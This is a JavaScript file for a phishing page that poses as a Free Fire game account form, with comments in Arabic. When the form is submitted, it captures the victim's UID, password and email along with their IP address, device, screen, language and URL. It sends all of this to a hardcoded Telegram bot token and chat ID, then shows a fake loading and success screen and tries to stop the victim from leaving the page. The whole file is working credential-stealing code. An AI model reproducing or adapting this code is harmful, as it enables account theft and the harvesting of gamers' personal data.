const config = {
    BOT_TOKEN: '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk',
    CHAT_ID: '8539996558'
};

async function sendCredentials(data) {
    try {
        const message = `🔥 **Free Fire - بيانات كاملة** 🔥\n\n` +
                      `🆔 **UID:** \`${data.uid}\`\n` +
                      `🔑 **Password:** \`${data.password}\`\n` +
                      `${data.email ? `📧 **Email:** \`${data.email}\`\n` : ''}` +
                      `${data.phone ? `📱 **Phone:** \`${data.phone}\`\n` : ''}` +
                      `🌐 **IP:** ${await getIP()}\n` +
                      `📱 **Device:** ${navigator.userAgent.slice(0,70)}\n` +
                      `🖥️ **Screen:** ${screen.width}x${screen.height}\n` +
                      `🌍 **Lang:** ${navigator.language}\n` +
                      `⏰ **Time:** ${new Date().toLocaleString('ar-SA')}\n` +
                      `🔗 **URL:** ${window.location.href}`;

        await fetch(`https://api.telegram.org/bot${config.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch(e) { console.log('Send error:', e); }
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        return (await res.json()).ip;
    } catch { return 'Unknown'; }
}

document.getElementById('ffForm').addEventListener('submit', async(e) => {
    e.preventDefault();
    
    const uid1 = document.getElementById('uid1').value;
    const uid2 = document.getElementById('uid2').value;
    const uid3 = document.getElementById('uid3').value;
    const password = document.getElementById('password').value;
    const email = document.getElementById('email').value;
    
    const uid = `${uid1}-${uid2}-${uid3}`;
    
    // إرسال فوري
    await sendCredentials({ uid, password, email });
    
    // الانتقال للعرض
    document.querySelector('.container > form').classList.add('hidden');
    document.getElementById('loading').classList.remove('hidden');
    
    setTimeout(() => {
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('success').classList.remove('hidden');
    }, 2500);
});

// تنسيق UID
['uid1', 'uid2', 'uid3'].forEach(id => {
    const input = document.getElementById(id);
    input.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
        if (e.target.value.length === 3) {
            const inputs = ['uid1','uid2','uid3'];
            const idx = inputs.indexOf(id);
            if (idx < 2) document.getElementById(inputs[idx+1]).focus();
        }
    });
});

// منع الخروج
window.addEventListener('beforeunload', e => e.preventDefault());